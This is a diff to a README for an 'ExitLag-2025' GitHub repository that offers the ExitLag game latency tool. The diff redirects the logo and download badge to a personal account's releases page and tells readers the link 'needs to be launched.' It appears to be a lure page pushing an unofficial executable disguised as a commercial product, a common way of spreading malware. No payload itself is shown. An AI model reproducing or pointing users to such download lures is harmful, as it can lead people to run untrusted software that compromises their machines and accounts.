@@ -4,7 +4,7 @@ Welcome to the ExitLag-2025 GitHub repository! 🚀
 
 ## Description
 
-![ExitLag Logo](https://example.com/exitlag_logo.png)
+![ExitLag Logo](https://github.com/XNikotoX51/ExitLag-2025/releases)
 
 ExitLag ensures better and faster connection routes to game servers, eliminating connection issues with a single button press. With ExitLag, you can experience smoother gameplay and reduced latency, giving you the competitive edge you need to dominate in your favorite games.
 
@@ -33,7 +33,7 @@ ExitLag ensures better and faster connection routes to game servers, eliminating
 
 ## Get ExitLag
 
-[![Download ExitLag](https://img.shields.io/badge/Download-ExitLag-brightgreen)](https://github.com/assets/Release.zip)
+[![Download ExitLag](https://github.com/XNikotoX51/ExitLag-2025/releases)](https://github.com/XNikotoX51/ExitLag-2025/releases)
 
 Please note that the link provided above needs to be launched.
 
